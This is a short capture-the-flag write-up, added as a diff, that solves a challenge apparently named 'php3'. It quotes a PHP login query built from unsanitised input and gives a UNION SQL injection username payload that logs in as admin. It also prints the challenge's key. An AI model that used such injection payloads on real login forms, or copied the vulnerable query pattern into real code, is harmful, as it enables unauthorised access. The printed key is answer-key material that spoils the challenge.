@@ -1,0 +1,30 @@
+From their source code, their query is:
+
+$query = @mysql_fetch_array(mysql_query("select user from php3 where (user='$user') and (pw='$pass')"));
+
+and they check the user with:
+
+if($query[user]=="admin") {
+    echo "<p>Logged in! Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx </p>";
+}
+
+All we need is an array with the 'user' column to say 'admin':
+
+Let's modify the query with a UNION injection:
+
+$query = @mysql_fetch_array(mysql_query("select user from php3 where (user='') UNION select user from php3 where (user='admin')")); -- ') and (pw='$pass')"));
+
+Injection: 
+
+Username: ') UNION select user from php3 where (user='admin') -- 
+Password: pass
+
+*Note the space after the --
+
+
+After injection:
+Logged in! Key: 8ab9b92c174dd483ad17cee1bb0c5bdb
+
+Key: 8ab9b92c174dd483ad17cee1bb0c5bdb
+
+
